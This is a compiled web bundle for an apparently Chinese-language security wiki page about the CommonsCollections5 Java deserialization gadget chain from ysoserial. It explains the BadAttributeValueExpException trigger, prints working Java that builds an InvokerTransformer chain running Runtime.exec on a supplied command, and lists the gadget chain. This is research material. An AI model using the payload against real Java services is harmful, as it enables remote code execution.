"use strict";(self.webpackChunkwhoopsunix_wiki=self.webpackChunkwhoopsunix_wiki||[]).push([[8289],{38427:(e,n,o)=>{o.r(n),o.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>m,frontMatter:()=>a,metadata:()=>r,toc:()=>c});var t=o(85893),s=o(11151);const a={sidebar_position:1,tags:["ysoserial","PPPYSO"]},i="CommonsCollections5",r={id:"PPPYSO/gadgets/CommonsCollections/CommonsCollections5/CommonsCollections5",title:"CommonsCollections5",description:"0x01 BadAttributeValueExpException",source:"@site/docs/01-PPPYSO/01-gadgets/01-CommonsCollections/04-CommonsCollections5/04-CommonsCollections5.md",sourceDirName:"01-PPPYSO/01-gadgets/01-CommonsCollections/04-CommonsCollections5",slug:"/PPPYSO/gadgets/CommonsCollections/CommonsCollections5/",permalink:"/docs/PPPYSO/gadgets/CommonsCollections/CommonsCollections5/",draft:!1,unlisted:!1,editUrl:"https://github.com/Whoopsunix/whoopsunix.github.io/docs/01-PPPYSO/01-gadgets/01-CommonsCollections/04-CommonsCollections5/04-CommonsCollections5.md",tags:[{label:"ysoserial",permalink:"/docs/tags/ysoserial"},{label:"PPPYSO",permalink:"/docs/tags/pppyso"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["ysoserial","PPPYSO"]},sidebar:"tutorialSidebar",previous:{title:"CommonsCollections6",permalink:"/docs/PPPYSO/gadgets/CommonsCollections/CommonsCollections6/"},next:{title:"CommonsCollections3",permalink:"/docs/PPPYSO/gadgets/CommonsCollections/CommonsCollections3/"}},l={},c=[{value:"0x01 BadAttributeValueExpException",id:"0x01-badattributevalueexpexception",level:2},{value:"0x02 Gadget Chain",id:"0x02-gadget-chain",level:2}];function d(e){const n={code:"code",h1:"h1",h2:"h2",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",...(0,s.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"commonscollections5",children:"CommonsCollections5"}),"\n",(0,t.jsx)(n.h2,{id:"0x01-badattributevalueexpexception",children:"0x01 BadAttributeValueExpException"}),"\n",(0,t.jsxs)(n.p,{children:["CC5 \u4e0e CC6 \u65f6\u7684\u5206\u6790\u4e00\u6837\uff0c\u90fd\u662f\u901a\u8fc7 ",(0,t.jsx)(n.code,{children:"TiedMapEntry"})," \u6765\u89e6\u53d1  ",(0,t.jsx)(n.code,{children:"LazyMap"}),"\uff0cCC6 \u6784\u9020\u65f6\u9009\u9009\u4e86 ",(0,t.jsx)(n.code,{children:"hashCode()"})," \uff0c\u5b9e\u9645\u4e0a\u5728 ",(0,t.jsx)(n.code,{children:"TiedMapEntry"})," \u7c7b\u4e2d\u8fd8\u6709 ",(0,t.jsx)(n.code,{children:"equals()"}),"\u3001 ",(0,t.jsx)(n.code,{children:"toString()"})," \u65b9\u6cd5\u90fd\u8c03\u7528\u4e86 ",(0,t.jsx)(n.code,{children:"getValue()"}),"\uff0cCC5 \u4f7f\u7528\u7684\u662f ",(0,t.jsx)(n.code,{children:"toString()"}),"\u3002"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20230331101451473",src:o(61686).Z+"",width:"1208",height:"322"})}),"\n",(0,t.jsxs)(n.p,{children:["CC5 \u5f15\u51fa\u4e86\u4e00\u4e2a\u65b0\u7684 kick-off ",(0,t.jsx)(n.code,{children:"javax.management.BadAttributeValueExpException"}),"\uff0c \u5f53\u6ee1\u8db3\u4e0b\u9762\u4e24\u4e2a\u6761\u4ef6\u4e4b\u4e00\u65f6\u5c06\u8c03\u7528 ",(0,t.jsx)(n.code,{children:"toString()"})]}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"valObj \u975e String"}),"\n",(0,t.jsx)(n.li,{children:"System.getSecurityManager() == null"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20230331102622247",src:o(14961).Z+"",width:"1494",height:"880"})}),"\n",(0,t.jsxs)(n.p,{children:["\u90a3\u4e48\u8c03\u7528\u94fe\u5c31\u5f88\u597d\u5199\u4e86\uff0c\u53cd\u5c04\u4fee\u6539 ",(0,t.jsx)(n.code,{children:"BadAttributeValueExpException"})," \u7684 ",(0,t.jsx)(n.code,{children:"val"})," \u503c\u5c31\u884c"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'    public BadAttributeValueExpException getObject(final String command) throws Exception {\n      final String[] execArgs = new String[] { command };\n      // inert chain for setup\n      final Transformer transformerChain = new ChainedTransformer(\n              new Transformer[]{ new ConstantTransformer(1) });\n      // real chain for after setup\n      final Transformer[] transformers = new Transformer[] {\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer("getMethod", new Class[] {\n               String.class, Class[].class }, new Object[] {\n               "getRuntime", new Class[0] }),\n            new InvokerTransformer("invoke", new Class[] {\n               Object.class, Object[].class }, new Object[] {\n               null, new Object[0] }),\n            new InvokerTransformer("exec",\n               new Class[] { String.class }, execArgs),\n            new ConstantTransformer(1) };\n\n      final Map innerMap = new HashMap();\n\n      final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n\n      TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");\n\n      BadAttributeValueExpException val = new BadAttributeValueExpException(null);\n      Reflections.setFieldValue(val, "val", entry);\n//    Field valfield = val.getClass().getDeclaredField("val");\n//        Reflections.setAccessible(valfield);\n//    valfield.set(val, entry);\n\n      Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain\n\n      return val;\n   }\n'})}),"\n",(0,t.jsx)(n.h2,{id:"0x02-gadget-chain",children:"0x02 Gadget Chain"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"BadAttributeValueExpException.readObject()\n    TiedMapEntry.toString()\n        LazyMap.get()\n            ChainedTransformer.transform()\n                ConstantTransformer.transform()\n                InvokerTransformer.transform()\n"})})]})}function m(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},61686:(e,n,o)=>{o.d(n,{Z:()=>t});const t=o.p+"assets/images/image-20230331101451473-2cddae7bac5a00a091220f3bbcda3291.png"},14961:(e,n,o)=>{o.d(n,{Z:()=>t});const t=o.p+"assets/images/image-20230331102622247-b79f6cdbddd2379f73ba53008bc1db0c.png"},11151:(e,n,o)=>{o.d(n,{Z:()=>r,a:()=>i});var t=o(67294);const s={},a=t.createContext(s);function i(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);